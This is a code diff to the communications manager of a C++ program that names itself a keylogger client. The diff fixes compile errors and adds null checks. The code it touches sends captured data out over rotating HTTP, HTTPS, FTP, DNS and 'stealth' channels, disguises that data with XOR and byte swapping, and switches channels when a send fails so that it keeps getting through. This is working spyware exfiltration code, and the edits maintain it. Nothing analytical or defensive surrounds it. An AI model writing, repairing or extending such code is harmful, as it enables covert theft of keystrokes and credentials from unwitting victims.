@@ -1,8 +1,9 @@
 // KeyLoggerClient/src/communication/CommsManager.cpp
 
 #include "communication/CommsManager.h"
+#include "communication/BaseComms.h"
 #include "communication/HttpComms.h"
-#include "communication/FtpComms.h"
+#include "communication/FtpComms.h" 
 #include "communication/DnsComms.h"
 #include "security/StealthComms.h"
 #include "core/Logger.h"
@@ -18,6 +19,7 @@
 #include <vector>
 #include <cstdint>
 #include <string>
+#include <utility>
 
 // Fix: Remove constexpr and use regular string literal or static const
 static const std::string OBF_COMMS_MANAGER = OBFUSCATE("CommsManager");
@@ -32,18 +34,26 @@ CommsManager::~CommsManager() {
 }
 
 void CommsManager::InitializeCommsMethods() {
-    // Fix: Use std::unique_ptr<BaseComms> and explicit casting if needed
-    // Assuming your communication classes inherit from BaseComms
-    m_commsMethods[OBFUSCATE("http")] = std::make_unique<HttpComms>(m_config);
-    m_commsMethods[OBFUSCATE("https")] = std::make_unique<HttpComms>(m_config);
-    m_commsMethods[OBFUSCATE("ftp")] = std::make_unique<FtpComms>(m_config);
-    m_commsMethods[OBFUSCATE("dns")] = std::make_unique<DnsComms>(m_config);
-    m_commsMethods[OBFUSCATE("stealth")] = std::make_unique<StealthComms>(m_config);
+    // Create communication methods using explicit conversion
+    
+    // HTTP
+    m_commsMethods["http"] = std::unique_ptr<BaseComms>(new HttpComms(m_config));
+    
+    // HTTPS
+    m_commsMethods["https"] = std::unique_ptr<BaseComms>(new HttpComms(m_config));
+    
+    // FTP
+    m_commsMethods["ftp"] = std::unique_ptr<BaseComms>(new FtpComms(m_config));
+    
+    // DNS
+    m_commsMethods["dns"] = std::unique_ptr<BaseComms>(new DnsComms(m_config));
+    
+    // Stealth
+    m_commsMethods["stealth"] = std::unique_ptr<BaseComms>(new StealthComms(m_config));
     
     LOG_DEBUG("Initialized " + std::to_string(m_commsMethods.size()) + 
               " communication methods");
 }
-
 bool CommsManager::Initialize() {
     std::string method;
     
@@ -124,7 +134,9 @@ bool CommsManager::TransmitData(const std::vector<uint8_t>& data) {
     if (!success) {
         LOG_WARN("Primary transmission failed, attempting rotation");
         RotateCommsMethod();
-        success = m_currentMethod->SendData(securedData);
+        if (m_currentMethod) {
+            success = m_currentMethod->SendData(securedData);
+        }
     }
 
     return success;
@@ -188,10 +200,12 @@ std::vector<uint8_t> CommsManager::ObfuscateData(const std::vector<uint8_t>& dat
     
     // Technique 1: XOR with rotating key
     const std::string xorKey = m_config->GetEncryptionKey();
-    size_t keyIndex = 0;
-    for (auto& byte : obfuscated) {
-        byte ^= xorKey[keyIndex];
-        keyIndex = (keyIndex + 1) % xorKey.length();
+    if (!xorKey.empty()) {
+        size_t keyIndex = 0;
+        for (auto& byte : obfuscated) {
+            byte ^= xorKey[keyIndex];
+            keyIndex = (keyIndex + 1) % xorKey.length();
+        }
     }
     
     // Technique 2: Byte swapping
@@ -218,26 +232,36 @@ void CommsManager::AddStealthHeaders(std::vector<uint8_t>& data) {
 void CommsManager::RotateCommsMethod() {
     LOG_INFO("Rotating communication method");
     
-    // Find next method in rotation
-    auto it = m_commsMethods.find(m_config->GetCommsMethod());
+    // Find current method in rotation
+    std::string currentMethodName = m_config->GetCommsMethod();
+    auto it = m_commsMethods.find(currentMethodName);
+    
     if (it == m_commsMethods.end()) {
+        // If current method not found, start from beginning
         it = m_commsMethods.begin();
     } else {
+        // Move to next method
         ++it;
         if (it == m_commsMethods.end()) {
             it = m_commsMethods.begin();
         }
     }
 
-    m_config->SetValue("comms_method", it->first);
-    m_currentMethod = it->second.get();
-    
-    LOG_INFO("Communication method rotated to: " + it->first);
+    // Update configuration and current method
+    if (it != m_commsMethods.end()) {
+        m_config->SetValue("comms_method", it->first);
+        m_currentMethod = it->second.get();
+        LOG_INFO("Communication method rotated to: " + it->first);
+    } else {
+        LOG_ERROR("Failed to rotate communication method");
+        m_currentMethod = nullptr;
+    }
 }
 
 void CommsManager::Shutdown() {
     if (m_currentMethod) {
         m_currentMethod->Cleanup();
+        m_currentMethod = nullptr;
     }
     LOG_INFO("Communication manager shut down");
 }
